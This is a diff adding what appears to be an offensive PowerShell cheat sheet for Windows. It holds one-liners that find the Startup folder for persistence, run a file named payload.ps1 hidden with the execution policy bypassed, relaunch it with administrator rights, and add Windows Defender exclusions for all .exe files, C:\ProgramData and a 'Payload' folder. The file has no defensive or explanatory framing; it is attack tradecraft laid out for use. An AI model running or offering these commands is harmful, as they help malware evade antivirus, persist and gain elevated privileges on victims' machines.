@@ -1,0 +1,28 @@
+# Locate Windows Startup Directory
+[System.Environment]::GetFolderPath(7)
+
+# Exec PS1 File
+cmd /c start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\Users\u101\payload.ps1"
+
+# Exec PS1 File as Administrator
+powershell.exe "Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File C:\Users\u101\payload.ps1' -Verb RunAs"
+
+# Zip and Unzip
+powershell Compress-Archive C:\Users\u101\file1 C:\Users\u101\file1.zip
+powershell expand-archive C:\Users\u101\file1.zip C:\Users\u101\file1
+
+# Add and Remove Windows Defender Exclusion File | Folder | Process
+cmd /c start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "powershell.exe Add-MpPreference -ExclusionProcess '.exe'"
+cmd /c start /min "" powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\ProgramData\Payload"
+
+//Add Exclusion
+Add-MpPreference -ExclusionExtension '.exe' -ErrorAction Ignore;
+Add-MpPreference -ExclusionPath 'C:\ProgramData' -ErrorAction Ignore;
+Add-MpPreference -ExclusionProcess 'calc.exe' -ErrorAction Ignore;
+
+//Remove Exclusion
+Remove-MpPreference -ExclusionExtension '.exe' -ErrorAction Ignore;
+Remove-MpPreference -ExclusionPath 'C:\ProgramData' -ErrorAction Ignore;
+Remove-MpPreference -ExclusionProcess 'calc.exe' -ErrorAction Ignore;
+
+
